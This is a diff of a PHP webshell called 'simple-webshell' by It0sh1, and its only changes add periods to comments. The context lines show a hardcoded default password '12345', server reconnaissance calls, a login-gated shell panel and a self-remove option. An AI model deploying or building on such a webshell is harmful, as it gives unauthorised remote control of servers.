@@ -5,7 +5,7 @@
 # Github: https://github.com/It0sh1/simple-webshell
 **************/
 
-// start the session
+// start the session.
 session_start();
 
 // The author of the webshell.
@@ -14,10 +14,10 @@ const Author = "It0sh1";
 // Version of the webshell.
 const Version = "v1.0.3";
 
-// Default password
+// Default password.
 $default_pass = "12345";
 
-// LIST OF SOFTWARE INFORMATION FUNCTIONS
+// LIST OF SOFTWARE INFORMATION FUNCTIONS.
 $uname = php_uname();
 $server_software = $_SERVER['SERVER_SOFTWARE'];
 $server_ip = gethostbyname($_SERVER['HTTP_HOST']);
@@ -41,7 +41,7 @@ if(!isset($_SESSION["login"])) {
 	</center>";
 	die();
 }
-// The shell panel
+// The shell panel.
 if(isset($_SESSION['login'])) {
 	echo "<!DOCTYPE html>
 	<html>
@@ -131,7 +131,7 @@ if(isset($_GET['exec']) && $_GET['exec'] == "selfremove"){
 	}
 }
 
-// Logout script function
+// Logout script function.
 if(isset($_GET['link']) && $_GET['link'] == "logout"){
 	session_start();
 	session_destroy();
